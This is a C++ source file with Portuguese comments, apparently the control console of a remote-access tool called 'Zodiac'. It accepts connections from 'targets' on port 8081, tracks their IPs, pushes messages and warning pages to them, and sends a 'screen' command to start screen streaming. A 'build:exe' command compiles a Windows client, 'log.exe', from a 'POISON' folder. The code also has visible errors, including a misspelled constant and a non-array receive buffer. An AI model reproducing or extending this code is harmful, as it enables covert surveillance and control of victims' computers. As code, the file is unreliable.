#include <iostream>   // Fluxo de dados padrão (cout, cin)
#include <string>     // Gerenciamento seguro de strings de texto
#include <vector>     // Vetores dinâmicos para a tabela de conexões ativas
#include <cstring>    // Funções nativas de tratamento de memória e bytes (memset)
#include <sys/socket.h> // Cabeçalho essencial do Linux para sockets de rede (TCP/IP)
#include <netinet/in.h> // Estruturas de endereçamento de internet da árvore do Kernel
#include <arpa/inet.h>  // Conversores de endereços IP (inet_ntoa)
#include <unistd.h>     // Funções de manipulação de descritores e fechamentos (close)
#include <csignal>    // Tratamento de interrupções de hardware (SIGINT / Ctrl+C)
#include <sys/select.h> // Motor multiplexado de monitoramento paralelo (select)
#include <iomanip>    // Alinhadores de formatação para tabelas de console (setw)
#include <fstream>    // Manipulação e leitura de arquivos locais (.txt)

using namespace std;

// Estrutura de dados para armazenar as conexões indexadas na memória RAM
struct Alvo {
    int id;       // Descritor numérico do socket do alvo
    string ip;    // Endereço IP real obtido no handshake
};

// Protótipos das funções que serão declaradas e executadas no escopo final
void desenhar_menu_zodiac();
void fechar_fortaleza(int sinal);

// Paleta de Cores e Atributos ANSI Neon Cyberpunk para o Console Bash
const string RESET     = "\033[0m";
const string ROXO      = "\033[35m\033[1m";
const string VERMELHO  = "\033[31m\033[1m";
const string VERDE     = "\033[32m\033[1m";
const string CIANO     = "\033[36m\033[1m";
const string AMARELO   = "\033[33m\033[1m";
const string BRANCO    = "\033[37m\033[1m";
const string PISCANDO  = "\033[5m";

int socket_principal;      // Descritor global da porta de escuta da central
vector<Alvo> lista_alvos;  // Tabela dinâmica que lista os alvos capturados
int main() {
    // Intercepta e gerencia os sinais de queda e desligamento (Ctrl+C)
    signal(SIGINT, fechar_fortaleza);
    signal(SIGPIPE, SIG_IGN); // Ignora erros de canais quebrados para evitar o crash do programa
    
    int PORTA_ARMADILHA  = 8081; // Porta de escuta fixa da central Zodíaco         
    socket_principal = socket(AF_INET, SOCK_STREAM, 0); // Cria o socket IPv4 TCP
    
    int op = 1;
    setsockopt(socket_principal, SOL_SOCKET, SO_REUSEADDR, &op, sizeof(op)); // Libera a porta na memória RAM instantaneamente

    struct sockaddr_in endereco;
    memset(&endereco, 0, sizeof(endereco));
    endereco.sin_family = AF_INET;
    endereco.sin_addr.s_addr = INADDR_ANY; // Aceita tráfego externo de qualquer interface de rede
    endereco.sin_port = htons(PORTA_ARMADILHA);

    // Vincula a porta física ao socket do Kernel do Linux
    if (bind(socket_principal, (struct sockaddr*)&endereco, sizeof(endereco)) < 0) {
        cout << VERMELHO << "[!] ERRO CRÍTICO: A porta " << PORTA_ARMADILHA << " já está ocupada por outro processo." << RESET << endl;
        return 1;
    }

    listen(socket_principal, 50); // Abre a fila de escuta para até 50 conexões paralelas
    desenhar_menu_zodiac();

    fd_set conjunto_leitura; // Tabela de monitoramento de fluxo para o select()

    while (true) {
        FD_ZERO(&conjunto_leitura);
        FD_SET(socket_principal, &conjunto_leitura); // Insere o socket de rede na vigilância
        FD_SET(STDIN_FILENO, &conjunto_leitura);      // Insere o seu teclado na vigilância paralela

        int max_fd = socket_principal;
        for (const auto& alvo : lista_alvos) {
            FD_SET(alvo.id, &conjunto_leitura);
            if (alvo.id > max_fd) max_fd = alvo.id;
        }

        // Multiplexador: Aguarda atividade sem gastar processamento da CPU
        int atividade = select(max_fd + 1, &conjunto_leitura, NULL, NULL, NULL);
        if (atividade < 0) continue;

        // Admissão: Se um novo chassi bater na porta 8081
        if (FD_ISSET(socket_principal, &conjunto_leitura)) {
            struct sockaddr_in cliente;
            socklen_t tamanho_addr = sizeof(cliente);
            int novo_socket = accept(socket_principal, (struct sockaddr*)&cliente, &tamanho_addr);

            if (novo_socket >= 0) {
                Alvo novo_alvo;
                novo_alvo.id = novo_socket;
                novo_alvo.ip = inet_ntoa(cliente.sin_addr);
                lista_alvos.push_back(novo_alvo); // Adiciona o IP real na tabela dinâmica

                cout << VERDE << "\n[🛰️ ALVO INTERCEPTADO] ➔ Chassi pareado no terminal: " << AMARELO << novo_alvo.ip << BRANCO << " (ID: " << novo_alvo.id << ")" << RESET << endl;
                cout << CIANO << "ZODIAC_NULL_CONSOLE_> " << flush;
                
                string welcome = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n[CONEXÃO MONITORADA PELO NÚCLEO SUPREMO ZODÍACO]\n";
                send(novo_socket, welcome.c_str(), welcome.length(), 0);
            }
        }
        // Tratamento de Teclado: Processa o console interativo digitado pelo Operador NULL
        if (FD_ISSET(STDIN_FILENO, &conjunto_leitura)) {
            string entrada;
            getline(cin, entrada);

            if (entrada == "clear") {
                system("clear");
                desenhar_menu_zodiac();
            }
            // Comando build: Compila o log.exe para Windows automaticamente via MinGW local em background
            else if (entrada == "build:exe") {
                cout << AMARELO << "\n[*] [ZODIAC BUILDER] Compilando automaticamente o executável estático do Windows..." << RESET << endl;
                int status = system("x86_64-w64-mingw32-g++ -O3 /home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp -o /home/gabriel/POISON/ZODIAC-POISON_TAR/log.exe -lws2_32 -lgdiplus -static 2>/dev/null");
                
                if (status == 0) {
                    cout << VERDE << "[+] [SUCESSO] Compilação completa! Arquivo 'log.exe' gerado com as bibliotecas estáticas." << RESET << endl;
                } else {
                    cout << VERMELHO << "[x] [ERRO] Falha na compilação. Certifique-se de que o pacote 'mingw-w64' está instalado." << RESET << endl;
                }
            }
            else if (entrada == "exit:all") {
                cout << VERVELHO << "\n[-] [FECHAMENTO] Executando comando de ejeção global em lote..." << RESET << endl;
                for (const auto& alvo : lista_alvos) close(alvo.id);
                close(socket_principal);
                cout << VERDE << "[+] Central desligada com sucesso." << RESET << endl;
                exit(0);
            }
            else if (entrada == "list") {
                // Renderiza a tabela Matrix de chassis ativos na tela do console
                cout << ROXO << "\n+-------------------------------------------------------+" << RESET << endl;
                cout << CIANO << "|             TABELA DE CHASSIS ATIVOS (NULL)           |" << RESET << endl;
                cout << ROXO << "+----------+-------------------+------------------------+" << endl;
                cout << AMARELO << "| INDEX ID | ENDEREÇO IP REAL  | STATUS DO MONITOR      |" << endl;
                cout << ROXO << "+----------+-------------------+------------------------+" << RESET << endl;
                if (lista_alvos.empty()) {
                    cout << BRANCO << "|      [ NENHUM INTRUSO PRESO NA ARMADILHA ATUALMENTE ]        |" << RESET << endl;
                } else {
                    for (const auto& alvo : lista_alvos) {
                        cout << BRANCO << "| " << setw(8) << alvo.id 
                             << " | " << setw(17) << alvo.ip 
                             << " | " << VERDE << "LINHA MONITORADA 🟢 " << BRANCO << " |" << RESET << endl;
                    }
                }
                cout << ROXO << "+----------+-------------------+------------------------+\n" << RESET << endl;
            }
            else if (!entrada.empty()) {
                size_t pos_dois_pontos = entrada.find(":");
                if (pos_dois_pontos != string::npos) {
                    string prefixo = entrada.substr(0, pos_dois_pontos);
                    string resto = entrada.substr(pos_dois_pontos + 1);

                    if (prefixo == "kick" || prefixo == "strike") {
                        size_t sub_dois_pontos = resto.find(":");
                        string id_str = (sub_dois_pontos == string::npos) ? resto : resto.substr(0, sub_dois_pontos);
                        bool linkar_arquivo_local = (sub_dois_pontos != string::npos && resto.substr(sub_dois_pontos + 1) == "file");

                        try {
                            int id_alvo = stoi(id_str);
                            bool achou = false;

                            for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ++it) {
                                if (it->id == id_alvo) {
                                    achou = true;
                                    
                                    if (linkar_arquivo_local) {
                                        ifstream arquivo_local("/home/gabriel/POISON/ZODIAC-POISON_TAR/aviso.txt");
                                        string linhas_html_customizadas = "";
                                        
                                        if (arquivo_local.is_open()) {
                                            string linha;
                                            while (getline(arquivo_local, linha)) {
                                                linhas_html_customizadas += "<p>" + linha + "</p>";
                                            }
                                            arquivo_local.close();
                                        } else {
                                            linhas_html_customizadas = "<p>AVISO SUPREMO ZODIACO: Linha encerra por NULL.</p>";
                                        }

                                        string html_content = 
                                            "<!DOCTYPE html><html><head><meta charset='utf-8'><title>ZODIAC ENGINE</title>"
                                            "<style>"
                                            "body { background-color: #0d0d0d; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }"
                                            ".box { text-align: center; background: rgba(20, 20, 20, 0.9); border: 2px solid #ff0055; padding: 40px; box-shadow: 0 0 25px #ff0055, inset 0 0 15px rgba(255,0,85,0.3); border-radius: 8px; max-width: 600px; }"
                                            "h1 { font-size: 36px; color: #ff0055; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0055; }"
                                            "p { font-size: 16px; color: #d9d9d9; line-height: 1.6; }"
                                            "</style></head><body>"
                                            "<div class='box'>"
                                            "<h1>[ ZODIAC INTERCEPT ]</h1>" + linhas_html_customizadas +
                                            "<p style='color:#ff0055; font-size:12px; margin-top:25px;'>⚡ OPERADOR: NULL ⚡</p>"
                                            "</div></body></html>";

                                        string payload_html = 
                                            "HTTP/1.1 200 OK\r\n"
                                            "Content-Type: text/html; charset=UTF-8\r\n"
                                            "Content-Length: " + to_string(html_content.length()) + "\r\n"
                                            "Connection: close\r\n\r\n" + html_content;
                                        
                                        send(id_alvo, payload_html.c_str(), payload_html.length(), 0);
                                    }

                                    if (prefixo == "kick") {
                                        cout << VERMELHO << "\n[-] [EJEÇÃO] Expulsando o ID " << id_alvo << " do barramento." << RESET << endl;
                                        close(id_alvo);
                                    } else {
                                        cout << VERMELHO << "\n🔥 [ZODIAC STRIKE] -> Disparando comando de streaming no ID: " << id_alvo << RESET << endl;
                                        string carga = "screen\n"; 
                                        send(id_alvo, carga.c_str(), carga.length(), 0);
                                    }

                                    lista_alvos.erase(it);
                                    break;
                                }
                            }
                            if (!achou) cout << VERMELHO << "[!] ID não encontrado." << RESET << endl;
                        } 
                        catch (...) {
                            cout << VERMELHO << "[!] Use 'kick:ID:file' ou 'strike:ID'" << RESET << endl;
                        }
                    }
                    else {
                        string msg_real = "🚨 [AVISO ZODIACO]: " + resto + "\n";
                        if (prefixo == "all") {
                            for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ) {
                                if (send(it->id, msg_real.c_str(), msg_real.length(), 0) < 0) {
                                    close(it->id);
                                    it = lista_alvos.erase(it);
                                } else {
                                    ++it;
                                }
                            }
                        } else {
                            try {
                                int id_alvo = stoi(prefixo);
                                send(id_alvo, msg_real.c_str(), msg_real.length(), 0);
                            } catch (...) {}
                        }
                    }
                }
            }
            cout << CIANO << "ZODIAC_NULL_CONSOLE_> " << flush;
        }

        // Monitoramento de Rede: Detecta quedas ou fechamento voluntário das conexões remotos
        for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ) {
            if (FD_ISSET(it->id, &conjunto_leitura)) {
                char buf = {0}; 
                if (recv(it->id, buf, sizeof(buf) - 1, 0) <= 0) {
                    cout << VERMELHO << "\n[-] [DESCONEXÃO] O alvo do ID " << it->id << " quebrou a linha e fugiu." << RESET << endl;
                    close(it->id);
                    it = lista_alvos.erase(it);
                    cout << CIANO << "ZODIAC_NULL_CONSOLE_> " << flush;
                } else {
                    ++it;
                }
            } else {
                ++it;
            }
        }
    }
    return 0;
}

void desenhar_menu_zodiac() {
    cout << ROXO << "=================================================================================" << RESET << endl;
    cout << CIANO << " ______  ____  _____   _    ____ " << endl;
    cout << CIANO << "|_  _  |/ __ \\|  __ \\ | |  / ___|" << endl;
    cout << CIANO << "  / /  | /  \\ | |  \\ \\| | | |      " << VERMELHO << "   [ OPERADOR SUPREMO ]" << endl;
    cout << CIANO << " / /__ | \\__/ | |__/ /| | | |___   " << BRANCO << "       ⚡ " << VERMELHO << PISCANDO << "N U L L" << RESET << BRANCO << " ⚡" << endl;
    cout << CIANO << "|_____| \\____/|_____/ |_|  \\____|  " << VERDE << "   (⚙️ MATRIX CENTRAL ENGINE v10.0 ⚙️)" << endl;
    cout << ROXO << "=================================================================================" << RESET << endl;
    cout << VERDE << "   [+] Comandos: 'list' (tabela) | 'clear' (limpar) | 'exit:all' (desligar tudo)" << RESET << endl;
    cout << CIANO << "   [*] Controle: 'kick:ID:file'  | 'strike:ID' (Disparar streaming de vídeo)" << RESET << endl;
    cout << AMARELO << "   [⚡] INFRA-BUILD: 'build:exe' (Compila o cliente Windows via MinGW local)" << RESET << endl;
    cout << ROXO << "=================================================================================" << RESET << endl;
    cout << AMARELO << "   [*] Central Zodíaco operacional. Aguardando transmissões...\n" << RESET << endl;
}

void fechar_fortaleza(int sinal) {
    for (const auto& alvo : lista_alvos) close(alvo.id);
    close(socket_principal);
    exit(sinal);
}
